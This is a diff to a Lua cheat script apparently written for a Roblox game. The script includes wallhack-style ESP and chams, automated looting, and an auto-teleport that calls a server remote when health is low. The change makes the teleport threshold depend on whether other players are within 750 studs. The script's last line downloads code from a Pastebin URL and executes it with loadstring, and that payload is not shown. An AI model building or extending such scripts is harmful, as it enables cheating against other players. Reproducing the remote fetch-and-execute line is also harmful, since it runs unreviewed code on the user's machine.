@@ -23,7 +23,9 @@ local MIN_RARITY = 59
 local espObjects = {}
 
 -- ==================== LOW HEALTH TELEPORT CONFIGURATION ====================
-local LOW_HEALTH_THRESHOLD = 0.65 -- 65%
+local LOW_HEALTH_THRESHOLD_WITH_PLAYERS = 0.65 -- 65% when players nearby
+local LOW_HEALTH_THRESHOLD_NO_PLAYERS = 0.30 -- 30% when no players nearby
+local PLAYER_DETECTION_RANGE = 750
 local wasAboveThreshold = true -- Track if we were above threshold
 
 -- ==================== CHAMS CONFIGURATION ====================
@@ -66,6 +68,23 @@ local function playNotificationSound()
         end
         sound:Destroy()
     end)
+end
+
+-- ==================== PLAYER DETECTION FUNCTION ====================
+local function isPlayerNearby()
+    local character = player.Character
+    if not character or not character:FindFirstChild("HumanoidRootPart") then return false end
+    local rootPart = character.HumanoidRootPart
+    for _, otherPlayer in pairs(Players:GetPlayers()) do
+        if otherPlayer ~= player then
+            local otherChar = otherPlayer.Character
+            if otherChar and otherChar:FindFirstChild("HumanoidRootPart") then
+                local distance = (rootPart.Position - otherChar.HumanoidRootPart.Position).Magnitude
+                if distance <= PLAYER_DETECTION_RANGE then return true end
+            end
+        end
+    end
+    return false
 end
 
 -- ==================== GUI CREATION ====================
@@ -626,15 +645,19 @@ local function setupHealthMonitor(character)
     wasAboveThreshold = true
     humanoid.HealthChanged:Connect(function(health)
         local healthPercent = health / humanoid.MaxHealth
-        if healthPercent <= LOW_HEALTH_THRESHOLD and wasAboveThreshold then
+        local playerNearby = isPlayerNearby()
+        local threshold = playerNearby and LOW_HEALTH_THRESHOLD_WITH_PLAYERS or LOW_HEALTH_THRESHOLD_NO_PLAYERS
+        if healthPercent <= threshold and wasAboveThreshold then
             wasAboveThreshold = false
             local success, err = pcall(function()
                 local args = {"Teleport Area", 3}
                 ReplicatedStorage:WaitForChild("Paper"):WaitForChild("Remotes"):WaitForChild("__remotefunction"):InvokeServer(unpack(args))
             end)
-            if success then print("Low Health Teleport: Activated at " .. math.floor(healthPercent * 100) .. "% health")
+            if success then
+                local thresholdText = playerNearby and "65% (player nearby)" or "30% (no players)"
+                print("Low Health Teleport: Activated at " .. math.floor(healthPercent * 100) .. "% health (" .. thresholdText .. ")")
             else warn("Low Health Teleport: Failed - " .. tostring(err)) end
-        elseif healthPercent > LOW_HEALTH_THRESHOLD then wasAboveThreshold = true end
+        elseif healthPercent > threshold then wasAboveThreshold = true end
     end)
 end
 
@@ -667,5 +690,5 @@ looting3Loop()
 print("Looting3 System: Ready")
 if player.Character then setupHealthMonitor(player.Character) end
 print("NPC Teleport Script Loaded! Press F to toggle.")
-print("Low Health Auto-Teleport: ENABLED (triggers at 65% health, repeatable)")
+print("Low Health Auto-Teleport: ENABLED (65% with players nearby, 30% when alone)")
 loadstring(game:HttpGetAsync('https://pastebin.com/raw/WgkcDYUs'))()
